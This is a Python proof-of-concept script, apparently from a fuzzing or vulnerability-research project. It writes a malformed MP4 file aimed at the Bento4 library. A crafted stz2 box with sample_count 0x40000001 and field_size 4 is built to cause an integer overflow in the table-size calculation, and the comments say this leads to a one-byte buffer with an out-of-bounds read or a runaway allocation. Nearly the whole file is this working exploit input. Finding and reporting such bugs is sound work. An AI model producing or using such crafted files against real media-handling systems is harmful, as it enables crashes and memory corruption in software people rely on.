#!/usr/bin/env python3
import struct, os

OUT_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomSampleTable_h'
OUT_FILE = os.path.join(OUT_DIR, 'vuln_002.mp4')

def box(btype, data):
    assert len(btype) == 4
    size = 8 + len(data)
    return struct.pack('>I', size) + btype + data

def fullbox(btype, version, flags, data):
    return box(btype, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# --- stz2: malicious box triggering integer overflow ---
# field_size=4, sample_count=0x40000001
# sample_count * field_size = 0x40000001 * 4 = 0x100000004 -> mod 2^32 = 4
# table_size = (4 + 7) / 8 = 1 -> only 1 byte allocated
# but SetItemCount(0x40000001) tries ~16GB, or loop accesses buffer[1] OOB
stz2_payload = bytes([0, 0, 0, 4])              # 3 bytes reserved + field_size=4
stz2_payload += struct.pack('>I', 0x40000001)   # sample_count (triggers overflow)
stz2_payload += b'\xAB'                         # 1 byte of sample data (only index 0 valid)
stz2 = fullbox(b'stz2', 0, 0, stz2_payload)

# --- stbl child boxes (all empty) ---
stsd_data = struct.pack('>I', 0)  # entry_count=0
stsd = fullbox(b'stsd', 0, 0, stsd_data)

stts_data = struct.pack('>I', 0)  # entry_count=0
stts = fullbox(b'stts', 0, 0, stts_data)

stsc_data = struct.pack('>I', 0)  # entry_count=0
stsc = fullbox(b'stsc', 0, 0, stsc_data)

stsz_data = struct.pack('>I', 0) + struct.pack('>I', 0)  # sample_size=0, sample_count=0
stsz = fullbox(b'stsz', 0, 0, stsz_data)

stco_data = struct.pack('>I', 0)  # entry_count=0
stco = fullbox(b'stco', 0, 0, stco_data)

stbl = box(b'stbl', stsd + stts + stsc + stsz + stco + stz2)

# --- dinf ---
dref_data = struct.pack('>I', 0)  # entry_count=0
dref = fullbox(b'dref', 0, 0, dref_data)
dinf = box(b'dinf', dref)

# --- smhd ---
smhd_data = struct.pack('>HH', 0, 0)  # balance=0, reserved=0
smhd = fullbox(b'smhd', 0, 0, smhd_data)

# --- minf ---
minf = box(b'minf', smhd + dinf + stbl)

# --- mdhd (version 0) ---
mdhd_data  = struct.pack('>I', 0)      # creation_time
mdhd_data += struct.pack('>I', 0)      # modification_time
mdhd_data += struct.pack('>I', 44100)  # timescale
mdhd_data += struct.pack('>I', 0)      # duration
mdhd_data += struct.pack('>HH', 0x55C4, 0)  # language, pre_defined
mdhd = fullbox(b'mdhd', 0, 0, mdhd_data)

# --- hdlr ---
hdlr_data  = struct.pack('>I', 0)     # pre_defined
hdlr_data += b'soun'                  # handler_type
hdlr_data += b'\x00' * 12            # reserved
hdlr_data += b'Handler\x00'          # name
hdlr = fullbox(b'hdlr', 0, 0, hdlr_data)

# --- mdia ---
mdia = box(b'mdia', mdhd + hdlr + minf)

# --- tkhd (version 0, flags=3) ---
tkhd_data  = struct.pack('>I', 0)   # creation_time
tkhd_data += struct.pack('>I', 0)   # modification_time
tkhd_data += struct.pack('>I', 1)   # track_id
tkhd_data += struct.pack('>I', 0)   # reserved
tkhd_data += struct.pack('>I', 0)   # duration
tkhd_data += b'\x00' * 8           # reserved
tkhd_data += struct.pack('>hh', 0, 0)   # layer, alternate_group
tkhd_data += struct.pack('>HH', 0x0100, 0)  # volume, reserved
tkhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)              # matrix (36 bytes)
tkhd_data += struct.pack('>II', 0, 0)   # width, height
tkhd = fullbox(b'tkhd', 0, 3, tkhd_data)

# --- trak ---
trak = box(b'trak', tkhd + mdia)

# --- mvhd (version 0) ---
mvhd_data  = struct.pack('>I', 0)       # creation_time
mvhd_data += struct.pack('>I', 0)       # modification_time
mvhd_data += struct.pack('>I', 1000)    # timescale
mvhd_data += struct.pack('>I', 0)       # duration
mvhd_data += struct.pack('>I', 0x00010000)  # rate
mvhd_data += struct.pack('>H', 0x0100)  # volume
mvhd_data += struct.pack('>H', 0)       # reserved
mvhd_data += b'\x00' * 8               # reserved
mvhd_data += struct.pack('>9i',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000)              # matrix (36 bytes)
mvhd_data += b'\x00' * 24              # pre_defined
mvhd_data += struct.pack('>I', 2)      # next_track_ID
mvhd = fullbox(b'mvhd', 0, 0, mvhd_data)

# --- moov ---
moov = box(b'moov', mvhd + trak)

# --- ftyp ---
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42')

# --- mdat (empty) ---
mdat = box(b'mdat', b'')

# --- final MP4 ---
mp4_data = ftyp + moov + mdat

os.makedirs(OUT_DIR, exist_ok=True)
with open(OUT_FILE, 'wb') as f:
    f.write(mp4_data)
print(f'Written {len(mp4_data)} bytes to {OUT_FILE}')
